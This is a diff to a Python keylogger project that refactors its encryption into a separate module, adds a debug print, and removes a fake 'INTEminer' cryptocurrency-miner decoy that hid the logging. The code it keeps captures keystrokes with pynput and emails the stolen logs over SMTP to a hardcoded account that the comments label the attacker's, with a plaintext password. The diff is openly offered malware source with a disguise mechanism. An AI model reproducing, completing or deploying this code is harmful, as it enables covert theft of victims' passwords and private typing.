@@ -1,18 +1,11 @@
-# General libraries
-import os.path
-import time
-import random
-from cryptography.fernet import Fernet
-from os import path
+from settings import *
+import encryption
 from pynput.keyboard import Key, Listener
-from multiprocessing import Process
-
-# E-Mail libraries
 import smtplib 
 from email.mime.multipart import MIMEMultipart 
 from email.mime.text import MIMEText 
 from email.mime.base import MIMEBase 
-from email import encoders 
+from email import encoders
 
 keys = []
 keystrokes_count = 0
@@ -20,43 +13,8 @@ saves_count = 0
 logs_count = 1
 KEYSTROKES_BUFFER_SIZE = 20  # How many keystrokes before saving
 SAVES_BUFFER_SIZE = 2  # How many saves before sending
-LOGS_PATH = "Logs/"  # File path to save stolen data
 EMAIL_USER = "intelogger@gmail.com" # Attacker email
 EMAIL_PASSWORD = "Aa!12345" # Attacker password
-
-
-
-class Encryption():
-    encryptKey = "bfSmGi_FREbBA4tiQhD23rxeArgAysjxpdCg2mMEjmk="  # Generated using Fernet.generate_key()
-
-    @staticmethod
-    def encrypt(text):
-        """
-        This function encrypts data and returns the encryption.
-        :param text: The data to be encrypted.
-        :return: The encrypted text.
-        """
-        return Fernet(Encryption.encryptKey).encrypt(text.encode())
-
-    @staticmethod
-    def decrypt(text):
-        """
-        This function decrypts data and returns it as plain text.
-        :param text: The text to decrypt.
-        :return: The decrypted text.
-        """
-        return Fernet(Encryption.encryptKey).decrypt(text).decode()
-
-    @staticmethod
-    def bytes_from_file(filename, chunksize=8192):
-        with open(filename, "rb") as f:
-            while True:
-                chunk = f.read(chunksize)
-                if chunk:
-                    for b in chunk:
-                        yield chr(b)
-                else:
-                    break
 
 
 def press(key):
@@ -65,6 +23,7 @@ def press(key):
     Checks counters and sends the data to the logging function.
     :param key: The key pressed given from pynput module.
     """
+    print("Listener working")
     if str(key) == "Key.esc": # Checks for program exit
         return False
     global keys, keystrokes_count, saves_count
@@ -171,40 +130,3 @@ def send():
     
     smtp.sendmail(EMAIL_USER, EMAIL_USER, msg.as_string()) # Sending the email
     smtp.quit() # Terminate STMP session
-
-
-def miner(): # Fake miner
-    print("Welcome to INTEminer for INTEcoins!")
-    print("Mining", end = "")
-    INTEcoins=0
-    file_count = 1
-    while True:
-        # Miner messages
-        print(".", end = "")
-        randomNumber=random.randint(1, 100)
-        time.sleep(randomNumber/20) # Sleep for a short random time
-        if randomNumber%10 == 0:
-            INTEcoins += randomNumber
-            print("\nMined {} INTEcoins! You currently have {} coins!".format(randomNumber, INTEcoins))
-            print("Mining", end = "")
-
-        # Write fake logs
-        if randomNumber%50 == 0:
-            file_count+=1
-        else:
-            with open(LOGS_PATH + "INTEcoin{}.dat".format(file_count), "a") as file:
-                file.write("{0:b}".format(random.randint(10000000000,100000000000)))
-                file.close()
-
-"""
-if __name__ == '__main__':
-    p = Process(target = miner)
-    p.start()
-    p.join()
-"""
-
-
-with Listener(on_press=press) as listener: # Keypress listener
-    listener.join()
-
-miner()
